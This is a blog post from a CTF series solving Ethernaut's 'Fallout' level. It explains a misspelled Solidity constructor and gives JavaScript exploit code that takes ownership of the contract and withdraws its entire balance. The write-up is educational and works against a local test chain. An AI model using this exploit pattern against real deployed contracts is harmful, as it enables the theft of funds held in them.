Title: Solving Zeppelin's Ethernaut CTF - Fallout
Date: 2018-06-01 10:00
Tags: ethereum, solidity, ctf, smart contracts
Category: Ethereum
Slug: solving-zeppelin-ethernaut-ctf-fallout
Summary: Third post of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. In this one, we solve the second challenge: Fallback.

## Introduction
While in the [Introduction](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-intro/) of this series we setup the environment with Ganache-cli and Truffle, in the [second article](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-fallback/) we walked through deploying our first smart contract, the basics of Solidity and Web3 and finally found a way to become the owners of the Fallback contract, thus passing the first challenge. Now, we will solve the second one: [Fallout](https://ethernaut.zeppelin.solutions/level/0x220beee334f1c1f8078352d88bcc4e6165b792f6).

## The Fallout contract
Take a moment to *thoroughly* look at the contract's source code and try to find what is wrong with it.

Need a hint ? Remember what we talked [about contract's constructors](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-fallback#constructors).

Not quite there yet ? Observe the contract's name and the name of the *constructor*. Any difference ?
~~~solidity
contract Fallout is Ownable {
    ...
    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
    ...
}
~~~

Yeap, there it is. Fallout is not the same as Fal1out, which means: **Fallout does not have a constructor**. The function that was intended to be the contract's constructor is actually a regular **public** function that can be called by anyone, since its name does not match the contract's name.

Having discovered that, all we have to do now in order to become the owners of the contract (i.e. pass the challenge) is simply call the Fal1out function.

## Solving Fallout
Just follow this simple steps:

1. Start ganache-cli
2. Deploy the Fallout contract with Truffle
3. Write and execute exploit

Since steps 1 & 2 were covered in the [previous article](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-fallback#deploying-your-first-smart-contract), let's skip those here and move on to the fun stuff: exploiting the contract.

First, as you can see below, the structure of the exploit remains the same as in Fallback. We get the attacker account, an instance of the deployed vulnerable contract and check its owner.

~~~javascript
const FalloutContract = artifacts.require('Fallout')
const assert = require('assert')

async function execute(callback) {
    // Get attacker account
    let attacker = web3.eth.accounts[1]
    console.log(`Attacker address: ${attacker}`)

    // Instance vulnerable contract
    let contract = await FalloutContract.deployed()

    // Check who's the owner
    let contractOwner = await contract.owner.call()
    assert.equal(contractOwner, web3.eth.accounts[0])
    console.log(`Contract owner: ${contractOwner}`)

    //[...]

    callback()
}
module.exports = execute
~~~

Once done with that, we need to call the Fal1out function and assert the attacker has become the owner:
~~~javascript
await contract.Fal1out({
    from: attacker,
    value: web3.toWei(0.0009, 'ether')
})

// Check who's the owner now (:
contractOwner = await contract.owner.call()
assert.equal(contractOwner, attacker)
console.log(`Contract owner: ${contractOwner}`)
~~~

Excellent! As owners, we can withdraw the entire balance of the contract.
~~~javascript
// Withdraw all money
let response = await contract.collectAllocations({
    from: attacker
})
console.log(`Withdrew all allocations in transaction ${response.tx}`)
~~~

Aaand, challenge completed. That wasn't so hard, right ?

Find the entire [exploit code of the Fallout contract at my GitHub repo](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/fallout.exploit.js).

If you enjoyed this challenge, stay tuned! In the next post we will dive into the problems of randomness in the Ethereum blockchain with the next challenge: [Coin Flip](https://ethernaut.zeppelin.solutions/level/0xd340de695bbc39e72df800dfde78a20d2ed94035).
